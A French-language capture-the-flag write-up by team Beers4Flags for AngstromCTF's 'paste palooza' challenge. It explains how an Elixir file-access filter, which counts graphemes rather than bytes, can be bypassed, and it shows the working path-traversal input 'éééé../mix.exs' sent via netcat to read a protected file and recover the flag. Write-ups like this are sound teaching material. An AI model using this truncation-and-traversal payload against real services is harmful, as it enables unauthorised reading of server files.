# Angstorm - CTF writeup - misc - paste palooza - 150 pts
- Ici on a droit à un programme en [elixir](https://elixir-lang.org/).
- En regardant les [sources](src/pastepalooza/redacted), on voit vite notre but à atteindre dans le fichier [mix.exs](src/pastepalooza/redacted/mix.exs)
```
defmodule PastePalooza.Mixfile do
  use Mix.Project

  def project do
    [
      app: :pastepalooza,
      version: "0.1.0",
      elixir: "~> 1.5",
      start_permanent: Mix.env == :prod,
      deps: deps(),
      flag: "REDACTED"
    ]
  end
```
- En regardant en détail le contenu du programme on tombe sur une partie interessante :
```
defmodule Utility do

  def access(filename) do
    unsafe = "pastes/" <> filename <> ".txt"
    path = filter(unsafe <> <<0>>, "", String.length(unsafe))
    case File.read path do
      {:ok, content} -> content
      {:error, reason} -> "File not found.\n"
    end
  end

  def filter(<< head, tail :: binary >>, acc, n) do
    if n == 0 do
      acc
    else
      n = n - 1
      if head < 33 or head > 126 do
        filter(tail, acc, n)
      else
        filter(tail, acc <> <<head>>, n)
      end
    end
  end
end
```

- filename étant la variable controlée par l'utilisateur.
- Ici on teste donc du path traversal en mettant du ../ dans le nom de fichier, mais evidement cela ne fonctionne pas car le programme ajoute `.txt` en fin de fichier ce qui nous empèche d'aller récupérer le fichier `../mix.exs`
```
➜  ~ nc web.angstromctf.com 3001
Welcome to Paste Palooza!
Currently, only the file access feature is available.
Access a file by entering its name: ../mix.exs
File not found.
```
- En regardant en détail le programme on voit qu'il :
  - concatène `pastes/` notre variable `filename` et l'extension `.txt`
  - concatène le tout avec un null byte `<<0>>` et envoie le tout a la méthode filter en précisant la taille du string.
  - La fonction filter est une fonction récursive qui va passer la chaîne caractère par caractère en excluant les caractères dont le code ascii est inférieur à 33 ou supérieur à 126 via le [bitsring binary](https://hexdocs.pm/elixir/Kernel.SpecialForms.html#%3C%3C%3E%3E/1)

- On cherche donc un moyen d'enlever les quatres derniers caractères `.txt` en fin de notre chaine filename. Pour se faire, il faudrait que la taille trouvé par ` String.length(unsafe)` fasse 4 caractères de moins que la taille de notre chaîne itérée par `<< head, tail :: binary >>` afin de tronquer la chaine et pouvoir récupérer le contenu de mix.exs.

- On tombe sur cette article sur la gestion des caractères unicode par elixir :
https://www.bignerdranch.com/blog/elixir-and-unicode-part-2-working-with-unicode-strings/
> String.length in Elixir will give you the number of graphemes, which is how long the string “looks”. If you want byte_size or a count of codepoints, you’ll have to be explicit about that.

- On se rend compte qu'élixir renvoie dans string.length effectivement la taille apparente, mais non la taille réèlle si l'on envoie des caractères spéciaux :
```
iex> String.length("ë")
1
iex> << head, tail :: binary >> = "ë"
"ë"
iex> head
195
iex> tail
<<171>>
```
- Donc le caractère ë ne prend pas une taille de 1 mais en fait deux valeurs une fois découpé 195 et 171

- On applique donc la même logique au challenge en ajoutant quatres caractères ë en début de chaine qui seront enlevés par le filtre (30 < code ascii < 126) mais qui vont faire paraître la chaine 4 charactères plus petite que ce qu'elle l'est réellement.
- Par consequent les 4 derniers caractères ne seront pas recopiés par la fonction de filtrage et on obtient le flag en envoyant `éééé../mix.exs` en filename :

```
➜  ~ nc web.angstromctf.com 3001
Welcome to Paste Palooza!
Currently, only the file access feature is available.
Access a file by entering its name: éééé../mix.exs
defmodule PastePalooza.Mixfile do
  use Mix.Project

  def project do
    [
      app: :pastepalooza,
      version: "0.1.0",
      elixir: "~> 1.5",
      start_permanent: Mix.env == :prod,
      deps: deps(),
      flag: "actf{elixir_encoding}"
```


By team Beers4Flags

```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```
